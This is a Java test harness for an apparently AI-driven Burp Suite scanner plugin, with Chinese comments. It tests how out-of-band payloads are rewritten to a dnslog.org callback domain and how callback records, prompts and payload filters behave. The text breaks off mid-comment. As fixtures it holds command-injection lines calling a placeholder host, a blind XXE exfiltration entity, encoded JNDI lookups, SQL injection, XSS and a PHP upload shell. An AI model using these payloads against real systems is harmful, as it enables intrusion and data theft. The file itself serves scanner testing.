/*
 * Zack-AI-Scanner —— Burp Suite 的 AI 智能漏洞扫描插件
 * Copyright (C) 2026 Zack AI Scanner
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 *
 * SPDX-License-Identifier: GPL-3.0-or-later
 */
package com.zackai.core;

import com.google.gson.Gson;
import com.zackai.ui.LogPanel;
import java.net.InetAddress;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.TimeUnit;

/**
 * OASTClient 验证程序（不入 jar；Maven 只编译不自动运行）。
 *
 * <pre>
 *   mvn -q clean test-compile
 *   CP="target/classes:target/test-classes:$(mvn -q dependency:build-classpath -Dmdep.outputFile=/dev/stdout -Dmdep.includeScope=provided)"
 *   java -Djava.awt.headless=true -cp "$CP" com.zackai.core.OASTHarness            # 离线断言
 *   java -Djava.awt.headless=true -cp "$CP" com.zackai.core.OASTHarness --live     # 额外打一次真实回连
 * </pre>
 *
 * <p>离线部分喂固定 JSON，不碰网络；{@code --live} 会真的向 dnslog.org 申请会话、
 * 触发一次解析、再按随机前缀查回来，用于确认整条链路（需要能出网）。
 */
public class OASTHarness {

    static int passed = 0;
    static int failed = 0;

    static void check(String name, boolean ok, String detail) {
        if (ok) {
            ++passed;
            System.out.println("  ✅ " + name);
        } else {
            ++failed;
            System.out.println("  ❌ " + name + "  <- " + detail);
        }
    }

    public static void main(String[] args) throws Exception {
        boolean live = args.length > 0 && "--live".equals(args[0]);

        System.out.println("\n--- 会话获取与载荷改写（离线：不碰网络）---");
        check("插件级实例始终可用（dnslog.org 不需要凭据）", OASTClient.shared() != null, "返回 null");
        check("整个插件共用一个实例（= 共用一个回连域名）",
                OASTClient.shared() == OASTClient.shared(), "拿到了两个实例");
        check("默认服务端与基础域名与文档一致",
                "https://dnslog.org".equals(OASTClient.DEFAULT_SERVER)
                        && "log.nat.cloudns.ph.".equals(OASTClient.DEFAULT_BASE_DOMAIN),
                OASTClient.DEFAULT_SERVER + " / " + OASTClient.DEFAULT_BASE_DOMAIN);
        // 老配置文件里残留的 OOB 键（字段已从 Config 删除）既不能解析失败，也不能再把回连关掉
        ConfigManager.Config legacy = new Gson().fromJson(
                "{\"apiKey\":\"k\",\"oastEnabled\":false,\"oastServer\":\"\",\"oastBaseDomain\":\"\"}",
                ConfigManager.Config.class);
        check("旧配置文件残留 oastEnabled=false 不再影响启用",
                legacy != null && "k".equals(legacy.getApiKey()) && OASTClient.shared() != null,
                "解析失败或回连被关掉");
        check("随机前缀是 8 位十六进制且不重复",
                OASTClient.randomLabel().matches("[0-9a-f]{8}")
                        && !OASTClient.randomLabel().equals(OASTClient.randomLabel()),
                OASTClient.randomLabel());

        System.out.println("\n--- 载荷里的回连域名与前缀（离线）---");
        final String oastHost = "7f917734.log.nat.cloudns.ph";
        final String label = "3f9ac1d2";
        check("模型漏改占位符 → 换成本次域名，并补上随机前缀",
                (";nslookup " + label + "." + oastHost).equals(
                        OASTClient.applyCallbackHost(";nslookup oob.invalid", oastHost, label)),
                OASTClient.applyCallbackHost(";nslookup oob.invalid", oastHost, label));
        check("模型自己写的标签被换成本次请求的随机前缀",
                (";nslookup " + label + "." + oastHost).equals(
                        OASTClient.applyCallbackHost(";nslookup p1.oob.invalid", oastHost, label)),
                OASTClient.applyCallbackHost(";nslookup p1.oob.invalid", oastHost, label));
        check("照抄示例、已经写成真实域名时同样换掉前缀",
                ("|ping -n 1 -w 2000 " + label + "." + oastHost).equals(
                        OASTClient.applyCallbackHost("|ping -n 1 -w 2000 p1." + oastHost, oastHost, label)),
                OASTClient.applyCallbackHost("|ping -n 1 -w 2000 p1." + oastHost, oastHost, label));
        check("URL 形态只在前缀位置插标签，路径原样保留",
                ("http://" + label + "." + oastHost + "/evil.dtd").equals(
                        OASTClient.applyCallbackHost("http://oob.invalid/evil.dtd", oastHost, label)),
                OASTClient.applyCallbackHost("http://oob.invalid/evil.dtd", oastHost, label));
        check("带 % 实体的 Blind XXE 载荷只动域名部分",
                ("<!ENTITY % e SYSTEM 'http://" + label + "." + oastHost + "/?data=%dtds;'>").equals(
                        OASTClient.applyCallbackHost("<!ENTITY % e SYSTEM 'http://oob.invalid/?data=%dtds;'>", oastHost, label)),
                OASTClient.applyCallbackHost("<!ENTITY % e SYSTEM 'http://oob.invalid/?data=%dtds;'>", oastHost, label));
        // 整体 URL 编码是 WAF 绕过指南里明确要求的手法。此前 %2F 结尾的 F 会被当成「词中的字母数字」，
        // 于是不补前缀 —— 载荷解析的是裸域名，按前缀过滤的轮询永远查不到，真漏洞静默漏报。
        String enc = OASTClient.applyCallbackHost(
                "%24%7Bjndi%3Adns%3A%2F%2Foob.invalid%2Fx%7D", oastHost, label);
        check("整体 URL 编码的载荷也要补随机前缀（%2F 结尾不算词中）",
                enc.contains("%2F%2F" + label + "." + oastHost) && !enc.contains("oob.invalid"), enc);
        String enc2 = OASTClient.applyCallbackHost("http%3A%2F%2Foob.invalid%2Fx", oastHost, label);
        check("http%3A%2F%2F 形态同样补前缀",
                enc2.contains("%2F%2F" + label + "." + oastHost), enc2);
        String enc3 = OASTClient.applyCallbackHost("http%253A%252F%252Foob.invalid", oastHost, label);
        check("双写编码（%252F）同样补前缀",
                enc3.contains(label + "." + oastHost), enc3);
        check("前面真是标识符字符时不硬插前缀（避免改坏本来就没法解析的载荷）",
                ("x_" + oastHost).equals(OASTClient.applyCallbackHost("x_oob.invalid", oastHost, label)),
                OASTClient.applyCallbackHost("x_oob.invalid", oastHost, label));
        // 占位符的「点被百分号编码」写法：只认 oob.invalid 时，这类载荷既不改写也不轮询 ——
        // 目标解析的是保留域名，回连永远不会出现，属于静默漏报
        String encPlaceholder = OASTClient.applyCallbackHost("http://oob%2Einvalid/x", oastHost, label);
        check("整体编码的占位符（oob%2Einvalid）也改写成本次域名",
                encPlaceholder.equals("http://" + label + "." + oastHost + "/x"), encPlaceholder);
        check("大写占位符（OOB.INVALID）也认", OASTClient.isOobPayload("http://OOB.INVALID/x", oastHost)
                && OASTClient.applyCallbackHost("http://OOB.INVALID/x", oastHost, label)
                        .equals("http://" + label + "." + oastHost + "/x"),
                OASTClient.applyCallbackHost("http://OOB.INVALID/x", oastHost, label));
        check("非外带载荷一个字都不动",
                "1' OR '1'='1".equals(OASTClient.applyCallbackHost("1' OR '1'='1", oastHost, label)),
                OASTClient.applyCallbackHost("1' OR '1'='1", oastHost, label));
        check("未取得回连域名时原样返回（不外带、不报错）",
                ";nslookup oob.invalid".equals(OASTClient.applyCallbackHost(";nslookup oob.invalid", null, label)),
                OASTClient.applyCallbackHost(";nslookup oob.invalid", null, label));
        check("能认出外带载荷（只有这类载荷才轮询回连记录）",
                OASTClient.isOobPayload(";nslookup oob.invalid", null)
                        && OASTClient.isOobPayload(";nslookup " + oastHost, oastHost)
                        && !OASTClient.isOobPayload("1' OR '1'='1", oastHost),
                "isOobPayload 判断错误");
        check("域名被写成大写时同样兜底（换成小写域名 + 本次前缀）",
                (";nslookup " + label + "." + oastHost).equals(
                        OASTClient.applyCallbackHost(";nslookup " + oastHost.toUpperCase(Locale.ROOT), oastHost, label)),
                OASTClient.applyCallbackHost(";nslookup " + oastHost.toUpperCase(Locale.ROOT), oastHost, label));
        check("大写域名也能认出是外带载荷（否则不会去查回连记录）",
                OASTClient.isOobPayload(";nslookup " + oastHost.toUpperCase(Locale.ROOT), oastHost), "没认出来");

        System.out.println("\n--- 记录解析：只认自己 key 名下、且前缀是本次请求的记录 ---");
        OASTClient client = new OASTClient(OASTClient.DEFAULT_SERVER, OASTClient.DEFAULT_BASE_DOMAIN);
        OASTClient.Session session = OASTClient.testSession("7f917734", "ytbhsfybulyo",
                OASTClient.DEFAULT_BASE_DOMAIN);
        check("回连域名由 key + 基础域名拼成（无尾点）",
                "7f917734.log.nat.cloudns.ph".equals(session.getDomain()), session.getDomain());

        // 文档里的真实响应
        String realResponse = "{\"0\":{\"ip\":\"219.128.128.102:64037\","
                + "\"subdomain\":\"test.7f917734.log.nat.cloudns.ph.\",\"time\":\"2026-09-21 16:44:17\"},"
                + "\"1\":{\"ip\":\"219.128.128.90:54400\","
                + "\"subdomain\":\"test.7f917734.log.nat.cloudns.ph.\",\"time\":\"2026-09-21 16:44:18\"}}";
        List<String> records = client.parseRecords(realResponse, session, "test");
        check("前缀匹配的记录被取回，且同一次回连按子域去重（多解析器只算一次）",
                records.size() == 1, "返回 " + records.size() + " 条：" + records);
        if (records.size() == 1) {
            String r = records.get(0);
            check("描述含本次请求前缀", r.contains("\"test\"") && r.contains("本次请求前缀"), r);
            check("描述含完整域名", r.contains("test.7f917734.log.nat.cloudns.ph."), r);
            check("描述含解析器 IP", r.contains("219.128.128.102"), r);
            check("描述含时间", r.contains("2026-09-21 16:44:17"), r);
        }
        check("别的前缀的记录不算本次的（并发任务/别的载荷不会串味）",
                client.parseRecords(realResponse, session, "deadbeef").isEmpty(), "串到别人的记录上了");

        // 前缀不一定在最左侧（2026-09-24 改）：JNDI 的 dns:// 带路径时会多一层（x.<前缀>.<key>.<基础域>），
        // 应用也可能给自己的日志值加前缀。只认最左标签的话，一次真发生了的回连会被自己的过滤器丢掉。
        String shiftedResponse = "{\"0\":{\"ip\":\"1.1.1.1:1\",\"subdomain\":\"x.test.7f917734.log.nat.cloudns.ph.\","
                + "\"time\":\"2026-09-24 10:00:00\"}}";
        List<String> shifted = client.parseRecords(shiftedResponse, session, "test");
        check("前缀前面多一层（JNDI 带路径那种）照样归属本次请求", shifted.size() == 1, String.valueOf(shifted));
        check("描述里写的是**本次请求自己的前缀**，不是子域最左那一段（写错会让人以为自己前缀打错了）",
                shifted.size() == 1 && shifted.get(0).contains("\"test\"") && !shifted.get(0).contains("\"x\""),
                String.valueOf(shifted));
        check("前缀在中间位置也算（应用自己加前缀的形态）",
                client.parseRecords("{\"0\":{\"subdomain\":\"x.test.7f917734.log.nat.cloudns.ph.\"}}",
                        session, "test").size() == 1, "没认出来");
        check("带前缀的记录仍然不认其他前缀（x 不算、别的标签也不算）",
                client.parseRecords(shiftedResponse, session, "deadbeef").isEmpty(), "串味了");
        check("前缀大小写不敏感（解析器可能把子域记成大写）",
                client.parseRecords(realResponse, session, "TEST").size() == 1, "大写前缀没匹配上");

        // 无前缀的裸 <key>.<基础域名> 记录**不算本次的**：它无法归属到某一次请求
        // （所有任务共用同一个 key），认下来就等于把别人的回连算成自己的。
        // 描述里那句「载荷未加随机前缀」的分支就是因此删掉的 —— 它与过滤规则矛盾，
        // 而且生产路径永远走不到（applyCallbackHost 会把随机前缀补在域名最左侧）。
        String bareResponse = "{\"0\":{\"ip\":\"3.3.3.3:3\",\"subdomain\":\"7f917734.log.nat.cloudns.ph.\","
                + "\"time\":\"2026-09-21 16:50:59\"}}";
        check("无前缀的裸域名记录不算本次的（无法归属到某一次请求）",
                client.parseRecords(bareResponse, session, "test").isEmpty()
                        && client.parseRecords(bareResponse, session, "deadbeef").isEmpty(),
                String.valueOf(client.parseRecords(bareResponse, session, "test")));

        // 域名紧跟标识符字符时 applyCallbackHost **故意不插前缀**（免得把载荷改坏），
        // 回连记录的最左标签于是成了「载荷自带的前缀 + 本次前缀」。只认相等的话，
        // 一次真的发生了的回连会被自己的过滤器丢掉 → 最终判「无变化即无漏洞」。
        String midWordResponse = "{\"0\":{\"ip\":\"4.4.4.4:4\","
                + "\"subdomain\":\"x_test.7f917734.log.nat.cloudns.ph.\",\"time\":\"2026-09-21 16:44:17\"}}";
        check("「载荷前缀 + 本次前缀」形态的回连仍归属本次请求（x_test.<域名>）",
                client.parseRecords(midWordResponse, session, "test").size() == 1,
                String.valueOf(client.parseRecords(midWordResponse, session, "test")));
        check("别的请求的前缀仍然不算（x_other 不会算到 test 头上）",
                client.parseRecords(midWordResponse, session, "deadbeef").isEmpty(), "串味了");

        // 解析器可能把整个子域记成大写：host 比较与 label 比较都必须容忍，
        // 否则后者的容忍是死代码（大写记录在前一步就被挡掉了）
        String upperResponse = "{\"0\":{\"ip\":\"5.5.5.5:5\","
                + "\"subdomain\":\"TEST.7F917734.LOG.NAT.CLOUDNS.PH.\",\"time\":\"2026-09-21 16:44:17\"}}";
        check("整条子域被记成大写时仍能取回（host 比较不再大小写敏感）",
                client.parseRecords(upperResponse, session, "test").size() == 1,
                String.valueOf(client.parseRecords(upperResponse, session, "test")));

        checkPollRetrySection();

        System.out.println("\n--- 公共平台的关键防护：只认自己 key 名下的记录 ---");
        String mixed = "{\"0\":{\"ip\":\"1.1.1.1:1\",\"subdomain\":\"mine.aabbccdd.log.nat.cloudns.ph.\","
                + "\"time\":\"2026-09-21 16:44:17\"},"
                + "\"1\":{\"ip\":\"2.2.2.2:2\",\"subdomain\":\"mine.7f917734.log.nat.cloudns.ph.\","
                + "\"time\":\"2026-09-21 16:44:18\"}}";
        List<String> filtered = client.parseRecords(mixed, session, "mine");
        check("别人的回连被过滤掉（否则会把别人的记录当成自己的发现）",
                filtered.size() == 1 && filtered.get(0).contains("mine.7f917734"), String.valueOf(filtered));

        System.out.println("\n--- 边界与异常 ---");
        check("无记录时服务端返回字面量 null → 空列表且不报错",
                client.parseRecords("null", session, "test").isEmpty() && client.getLastError() == null,
                "lastError=" + client.getLastError());
        check("空响应 → 空列表", client.parseRecords("", session, "test").isEmpty(), "非空");
        check("非 JSON → 空列表且给出原因",
                client.parseRecords("<html>502</html>", session, "test").isEmpty() && client.getLastError() != null,
                String.valueOf(client.getLastError()));
        check("记录缺字段 → 不抛异常",
                client.parseRecords("{\"0\":{\"subdomain\":\"test.7f917734.log.nat.cloudns.ph.\"}}",
                        session, "test").size() == 1,
                "记录被丢弃");
        check("value 不是对象 → 跳过而不抛异常",
                client.parseRecords("{\"0\":\"字符串\",\"1\":null}", session, "test").isEmpty(), "非空");
        check("没有会话（申请失败）时轮询 → 空列表",
                client.pollInteractions(null, "test").isEmpty(), "非空");
        check("没有前缀时轮询 → 空列表",
                client.pollInteractions(session, null).isEmpty(), "非空");

        if (live) {
            System.out.println("\n--- 真实链路（--live）---");
            OASTClient liveClient = OASTClient.shared();
            // 先打一次「测试回连」按钮/插件加载走的完整回环（申请域名 → 本机解析 → 查回记录）
            OASTClient.SelfTestResult selfTest = liveClient.selfTest();
            check("回连自检（按钮与插件加载走的就是这条）成功", selfTest.ok, selfTest.message);
            if (selfTest.ok) {
                System.out.println("     " + selfTest.message);
                for (String record : selfTest.records) {
                    System.out.println("     " + record);
                }
            }
            OASTClient.Session liveSession = liveClient.ensureSession();
            check("申请到专属回连域名", liveSession != null, String.valueOf(liveClient.getLastError()));
            if (liveSession != null) {
                System.out.println("     域名: " + liveSession.getDomain());
                check("同一 Burp 会话复用同一个域名（不再每个任务申请一次）",
                        liveSession.getDomain().equals(liveClient.ensureSession().getDomain()),
                        "域名变了");
                String liveLabel = OASTClient.randomLabel();
                String probe = liveLabel + "." + liveSession.getDomain();
                System.out.println("     前缀: " + liveLabel + "  载荷域名: " + probe);
                try {
                    InetAddress.getByName(probe);
                } catch (Exception ignored) {
                    // 解析失败也无妨：只要查询打到了权威 DNS 就会被记录
                }
                Thread.sleep(6000);
                List<String> liveRecords = liveClient.pollInteractions(liveSession, liveLabel);
                check("触发解析后能按随机前缀查回这一条回连记录", !liveRecords.isEmpty(),
                        "未收到记录，lastError=" + liveClient.getLastError());
                for (String record : liveRecords) {
                    System.out.println("     " + record);
                }
                check("记录里能读出本次请求的前缀",
                        liveRecords.isEmpty() || liveRecords.get(0).contains(liveLabel), String.valueOf(liveRecords));
                check("用别的前缀查不到这条记录（归属确实靠前缀）",
                        liveClient.pollInteractions(liveSession, OASTClient.randomLabel()).isEmpty(), "串味了");
            }
        } else {
            System.out.println("\n（跳过真实链路；加 --live 可打一次真实回连）");
        }

        System.out.println("\n--- 延后外带验证的收尾语义（awaitOobVerifications）---");
        checkDeferredOobBookkeeping();

        System.out.println("\n--- 排队中被删掉的任务不再开工 ---");
        checkCancelledTaskDoesNotStart();

        System.out.println("\n--- 验证特征块按类型裁剪（trimVerifyFeatures）---");
        checkVerifyTrim();

        System.out.println("\n--- 检测链路：证据窗口与载荷过滤 ---");
        checkEvidenceWindow();
        checkPayloadFilter();

        System.out.println("\n--- 发现去重（同参数同类型只留最强那条）---");
        checkVulnDedup();

        System.out.println("\n--- 步骤2 的响应窗口 ---");
        checkStep2Window();

        System.out.println("\n--- 与 AI 的交互：截断补全 / 无差异跳过验证 ---");
        checkAiInteraction();

        System.out.println("\n--- 报告文本的截断阈值 ---");
        checkMarkdownReport();
        System.out.println("\n--- 后端语言指纹（决定文件上传载荷用哪门语言）---");
        checkBackendStack();

        System.out.println("\n--- 提示词层的守卫（授权声明 / 注入点按模式裁剪）---");
        checkPromptGuards();

        System.out.println("\n--- 报告的「测试参数」= 实际测过的位置 ---");
        checkTestParamsInReport();
        checkEnglishReport();
        checkMsgPlaceholderSafety();
        checkStep2ParamFilter();
        checkPositionAliases();
        checkOobSwitch();
        checkStrutsArithmetic();
        checkTaskCancelAndPoll();
        checkOobEdgeCases();
        checkConfidenceAndLocale();
        checkStep2WindowCap();
        System.out.println("\n--- 核心数字契约：报告门限 95 / 每组合 9 条载荷 ---");
        checkReportGateAndPayloadCount();
        System.out.println("\n--- 外带载荷的判定（有记录直接判 / 无记录 / 通道不可用）---");
        checkOobDirectDecision();
        System.out.println("\n--- 探测载荷对照锚点（同组合的成对证据）---");
        checkProbeAnchor();

        System.out.println("\n--- 步骤1 重放的看门狗（卡住时要能到点就走）---");
        checkStep1ReplayTimeout();

        System.out.println("\n--- 日志层（标签 / 分隔线 / 上限 / 载荷转义）---");
        checkLogLayer();

        System.out.println("\n========================================");
        System.out.println("通过 " + passed + " 项，失败 " + failed + " 项");
        System.exit(failed == 0 ? 0 : 1);
    }

    /**
     * 外带验证改成「发完接着发下一条、5 秒后由后台线程回头查」之后，收尾必须等它们跑完
     * （否则任务会先打「未发现漏洞」，几秒后又冒出一个漏洞）。
     * 这里只测这段等待语义，不碰网络：外带验证本身要连回连服务，测不了。
     */
    static void checkDeferredOobBookkeeping() throws Exception {
        // 只用得到 logPanel（异常分支要打日志），Burp 的两个接口这里传 null 即可
        AIEngine engine = new AIEngine(null, null, new LogPanel(), null);
        java.lang.reflect.Method await = AIEngine.class.getDeclaredMethod(
                "awaitOobVerifications", List.class, java.util.concurrent.ScheduledExecutorService.class);
        await.setAccessible(true);

        java.util.concurrent.ScheduledExecutorService idle =
                java.util.concurrent.Executors.newSingleThreadScheduledExecutor();
        List<java.util.concurrent.Future<?>> none = new java.util.ArrayList<>();
        long t0 = System.currentTimeMillis();
        await.invoke(engine, none, idle);
        long idleMs = System.currentTimeMillis() - t0;
        check("没有在途的外带验证时立即返回", idleMs < 200, "耗时 " + idleMs + " ms");
        check("收尾后调度器已关闭（正常路径）", idle.isShutdown(), "未关闭");

        // 收尾**不设上限**：整条列表都要等完（外带判定每条只剩一次 HTTP 查询，等待很便宜），
        // 靠后的载荷不会因为到点被放弃而丢掉结论
        java.util.concurrent.ScheduledExecutorService s =
                java.util.concurrent.Executors.newSingleThreadScheduledExecutor();
        final java.util.concurrent.atomic.AtomicBoolean first = new java.util.concurrent.atomic.AtomicBoolean(false);
        final java.util.concurrent.atomic.AtomicBoolean last = new java.util.concurrent.atomic.AtomicBoolean(false);
        List<java.util.concurrent.Future<?>> futures = new java.util.ArrayList<>();
        futures.add(s.schedule(() -> first.set(true), 150, TimeUnit.MILLISECONDS));
        futures.add(s.schedule(() -> last.set(true), 400, TimeUnit.MILLISECONDS));
        t0 = System.currentTimeMillis();
        await.invoke(engine, futures, s);
        long waited = System.currentTimeMillis() - t0;
        check("在途的外带验证跑完才返回（否则总结会先打「未发现漏洞」）",
                first.get() && waited >= 100, "等 " + waited + " ms，done=" + first.get());
        check("列表里靠后的载荷同样被等到（不设上限，不会被放弃）",
                last.get(), "最后一条没跑完就返回了");
        check("等待结束后关闭调度器", s.isShutdown(), "未关闭");

        java.util.concurrent.ScheduledExecutorService s2 =
                java.util.concurrent.Executors.newSingleThreadScheduledExecutor();
        List<java.util.concurrent.Future<?>> failing = new java.util.ArrayList<>();
        failing.add(s2.schedule(() -> {
            throw new IllegalStateException("模拟回连查询失败");
        }, 10, TimeUnit.MILLISECONDS));
        boolean threw = false;
        try {
            await.invoke(engine, failing, s2);
        } catch (Exception e) {
            threw = true;
        }
        check("一条外带验证抛异常不影响任务收尾", !threw, "awaitOobVerifications 抛了异常");
        check("异常路径同样关闭调度器", s2.isShutdown(), "未关闭");
    }

    /**
     * 排队中被删掉（= 已取消）的任务不再开工。
     *
     * <p>任务提交进池子后先排队，而池子只有 10 条线程 —— 等轮到它时，step1 重放与 step2/step3
     * 两次 AI 调用都要白花（几秒到几分钟）。载荷循环里那道取消检查要到 step3 之后才第一次生效，
     * 所以这里必须有一道开头的闸门。
     *
     * <p>断言方式：callbacks 传 null（这个 harness 允许的写法，见类注释）。**没这道闸门时**
     * 代码会走到 step1 去碰 {@code this.callbacks} 并抛 NPE，被 catch 住后把任务记成「分析失败」——
     * 所以「AI 标签仍是已取消、状态仍是已结束」这条既能证明没开工，也能证明没被改坏。
     */
    static void checkCancelledTaskDoesNotStart() throws Exception {
        AIEngine engine = new AIEngine(null, null, new LogPanel(), null);
        com.zackai.model.ScanTask task = new com.zackai.model.ScanTask(
                1, null, "POST", "http://t/upload", com.zackai.model.ScanTask.ScanMode.CUSTOM);
        task.cancel();
        engine.scanRequest(task);
        check("已取消的任务不再开工（排队中被删掉的不该再打一遍 AI）",
                com.zackai.model.ScanTask.TaskStatus.FINISHED == task.getStatus()
                        && "已取消".equals(task.getAiTag()),
                "状态=" + task.getStatus() + " 标签=" + task.getAiTag());
    }

    /**
     * 验证特征块现在按本次要判的类型裁剪（11 类特征占整份提示词的 3/4，每条载荷都带一份）。
     * 这里只验裁剪本身：块定位、重新编号、头尾保留，以及「对不上就整份返回」的兜底。
     */
    static void checkVerifyTrim() throws Exception {
        AIEngine engine = new AIEngine(null, null, new LogPanel(), null);
        java.lang.reflect.Method full = AIEngine.class.getDeclaredMethod("getDefaultVerifyPrompt");
        full.setAccessible(true);
        java.lang.reflect.Method trim = AIEngine.class.getDeclaredMethod("trimVerifyFeatures", String.class, java.util.Set.class);
        trim.setAccessible(true);
        String fullPrompt = (String) full.invoke(engine);

        String onlyShiro = (String) trim.invoke(engine, fullPrompt, new java.util.LinkedHashSet<>(List.of("Shiro反序列化")));
        check("只留要判的类型（Shiro）", onlyShiro.contains("1. Shiro反序列化")
                && onlyShiro.contains("rememberMe 解密成功并反序列化了 URLDNS gadget"), "块没留下");
        check("其它类型的特征块被删掉（SQL注入的强证据不在了）", !onlyShiro.contains("数据库错误信息"),
                "还留着 SQL注入 的特征");
        check("剪掉的提示词仍保留验证原则与输出格式",
                onlyShiro.contains("[验证原则]") && onlyShiro.contains("[输出要求]")
                        && onlyShiro.contains("\"vulnerable\":true"), "头或尾被切掉了");
        check("裁剪后确实变短（11 类 → 1 类）", onlyShiro.length() < fullPrompt.length() / 2,
                "裁剪后 " + onlyShiro.length() + " / 原始 " + fullPrompt.length());

        // 类型名里带空格的两种（Log4j2 JNDI注入 / Struts2 OGNL注入）曾因块首正则用 \S+ 而匹配不上，
        // 裁剪静默失效 —— 单独钉一条
        String onlyLog4j = (String) trim.invoke(engine, fullPrompt, new java.util.LinkedHashSet<>(List.of("Log4j2 JNDI注入")));
        check("类型名带空格时也能裁剪（Log4j2 JNDI注入）",
                onlyLog4j.contains("1. Log4j2 JNDI注入") && onlyLog4j.contains("${jndi:dns://")
                        && !onlyLog4j.contains("fastjson"), "带空格的块首没匹配上");

        String all = (String) trim.invoke(engine, fullPrompt, new java.util.LinkedHashSet<>(List.of(
                "SQL注入", "XSS跨站脚本", "命令注入", "文件上传", "SSRF服务端请求伪造", "XXE外部实体注入",
                "SSTI服务端模板注入", "Fastjson反序列化", "Log4j2 JNDI注入", "Struts2 OGNL注入", "Shiro反序列化")));
        check("11 类全要时逐字还原（重新编号不改变原文）", all.equals(fullPrompt),
                "长度 " + all.length() + " / 原始 " + fullPrompt.length());

        String unmatched = (String) trim.invoke(engine, fullPrompt, new java.util.LinkedHashSet<>(List.of("不存在的类型")));
        check("类型名对不上时整份返回（宁可多发，不能发半截）", unmatched.equals(fullPrompt), "被裁掉了");
    }

    /**
     * 长响应只给片段时，片段必须**以证据为中心**。
     * 只截头部会系统性漏报：回显型漏洞的证据常落在几十 KB 之后，模型看到的窗口里
     * 只有无差异的页头，于是判「与基线一致，没有漏洞」。
     */
    static void checkEvidenceWindow() throws Exception {
        java.lang.reflect.Method anchor = AIEngine.class.getDeclaredMethod(
                "evidenceAnchor", String.class, String.class, byte[].class);
        java.lang.reflect.Method excerpt = AIEngine.class.getDeclaredMethod(
                "excerptForPrompt", String.class, int.class, int.class);
        anchor.setAccessible(true);
        excerpt.setAccessible(true);

        StringBuilder big = new StringBuilder("HTTP/1.1 200 OK\r\n\r\n<html><body>");
        while (big.length() < 25000) big.append("<div>padding</div>\n");
        big.append("<div><script>alert(1)</script></div>");
        while (big.length() < 40000) big.append("<div>tail</div>\n");
        String resp = big.toString();
        String payload = "<script>alert(1)</script>";

        int at = (Integer) anchor.invoke(null, resp, payload, null);
        String win = (String) excerpt.invoke(null, resp, 8000, at);
        check("载荷回显在 25K 处时，验证窗口里能看到它（此前必然漏报）", win.contains(payload), "窗口里没有载荷");
        check("窗口标注了略过多少与关键位置", win.contains("前 ") && win.contains("关键位置在第 " + at), "缺少标注");

        String base = "HTTP/1.1 200 OK\r\n\r\n" + "x".repeat(30000) + "TAIL";
        String test = "HTTP/1.1 200 OK\r\n\r\n" + "x".repeat(30000) + "You have an error in your SQL syntax";
        int at2 = (Integer) anchor.invoke(null, test, "1' OR '1'='1", base.getBytes(java.nio.charset.StandardCharsets.UTF_8));
        String win2 = (String) excerpt.invoke(null, test, 8000, at2);
        check("载荷没回显但响应与基线有差异时，锚在首个差异处（能看到 SQL 报错）",
                win2.contains("You have an error in your SQL syntax"), "窗口里没有报错");

        String same = "y".repeat(20000);
        int at3 = (Integer) anchor.invoke(null, same, "zzz", null);
        String win3 = (String) excerpt.invoke(null, same, 8000, at3);
        check("没有锚点时退回头部截断（行为与以前一致）",
                at3 == -1 && win3.startsWith("yyy") && win3.contains("原文共 20000 字符"), "行为变了");
    }

    /**
     * name=value 过滤器只该看「本条载荷自己的目标参数」。
     * 用全部参数名去查会把 multipart 的整段 part 载荷（天然带 name="file"）整条误杀 ——
     * 请求里只要有名为 name / filename 的参数，文件上传就一条载荷都不剩。
     */
    static void checkPayloadFilter() throws Exception {
        AIEngine engine = new AIEngine(null, null, new LogPanel(), null);
        java.lang.reflect.Method norm = AIEngine.class.getDeclaredMethod(
                "normalizeStep3Response", String.class, List.class, byte[].class, java.util.Set.class);
        norm.setAccessible(true);
        com.google.gson.Gson gson = new com.google.gson.Gson();

        String wholePart = "Content-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\n"
                + "Content-Type: image/png\r\n\r\n<?php echo 1;?>";
        List<String> params = List.of("name", "filename", "file", "note");
        java.util.Set<String> mapped = new java.util.LinkedHashSet<>(List.of("file"));
        byte[] multipartRequest = ("POST /upload HTTP/1.1\r\nHost: x\r\n"
                + "Content-Type: multipart/form-data; boundary=----x\r\n\r\n"
                + "------x\r\nContent-Disposition: form-data; name=\"file\"; filename=\"a.png\"\r\n\r\nPNG\r\n------x--\r\n")
                .getBytes(java.nio.charset.StandardCharsets.UTF_8);
        int kept = payloadsOf(norm.invoke(engine,
                "{\"testPayloads\":[{\"type\":\"FILE_UPLOAD\",\"payload\":" + gson.toJson(wholePart)
                        + ",\"position\":\"file\",\"wafBypass\":false}]}",
                params, multipartRequest, mapped));
        check("请求里有 name/filename 参数时，整段 part 载荷仍保留（此前文件上传全灭）", kept == 1,
                "被丢弃了，保留 " + kept + " 条");

        int keptName = payloadsOf(norm.invoke(engine,
                "{\"testPayloads\":[{\"type\":\"FILE_UPLOAD\",\"payload\":" + gson.toJson("filename=\"shell.php\"")
                        + ",\"position\":\"file\",\"wafBypass\":false}]}",
                params, multipartRequest, mapped));
        check("改后缀载荷（filename=\"shell.php\"）同样保留", keptName == 1, "被丢弃了");

        // Burp 的参数表里到底有没有「部件名 file」由它的实现决定（也可能只报 filename 等属性），
        // 所以判据不能只依赖 Burp：请求里真的写着 name="file" 就该放行（否则文件上传整类不发包）
        int keptViaBody = payloadsOf(norm.invoke(engine,
                "{\"testPayloads\":[{\"type\":\"FILE_UPLOAD\",\"payload\":" + gson.toJson("filename=\"shell.php\"")
                        + ",\"position\":\"file\",\"wafBypass\":false}]}",
                List.of("name", "filename", "note"), multipartRequest, mapped));
        check("部件名不在 Burp 参数表里、但 multipart body 里真的有这个部件 → 仍放行",
                keptViaBody == 1, "被丢弃了，保留 " + keptViaBody + " 条");

        int keptEcho = payloadsOf(norm.invoke(engine,
                "{\"testPayloads\":[{\"type\":\"SQL注入\",\"payload\":" + gson.toJson("id=1' OR '1'='1")
                        + ",\"position\":\"id\",\"wafBypass\":false}]}",
                List.of("id", "name"), null, new java.util.LinkedHashSet<>(List.of("id"))));
        check("真出现「目标参数=值」形态时仍然丢弃（放宽没放过头）", keptEcho == 0,
                "保留了 " + keptEcho + " 条");

        // position 写成 filename **属性**时是另一个洞：步骤 2 的提示词让模型「照请求里的写法填」，
